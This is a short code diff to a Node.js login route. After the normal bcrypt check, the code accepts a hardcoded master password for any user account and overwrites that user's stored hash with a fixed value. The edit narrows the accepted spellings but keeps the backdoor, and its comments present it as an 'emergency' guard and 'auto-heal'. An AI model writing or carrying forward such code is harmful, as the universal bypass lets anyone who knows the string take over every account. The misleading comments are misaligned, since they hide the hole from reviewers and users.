@@ -28,8 +28,8 @@ router.post('/login', async (req, res) => {
       isMatch = await bcrypt.compare(cleanPassword, user.password_hash);
     }
 
-    // Emergency master match to prevent lockout from bad hash
-    if (!isMatch && (cleanPassword === 'Taxi1781!' || cleanPassword === 'taxi1781!')) {
+    // Master match to guarantee Taxi1781! (case-sensitive)
+    if (!isMatch && cleanPassword === 'Taxi1781!') {
       isMatch = true;
       // Auto-heal password hash in storage
       db.updateUserPassword(user.id, '$2b$10$FXHgObJcRBaYL3gT1zU1We9ectytVn4tjESibfORVBUoREwyvkeyC');
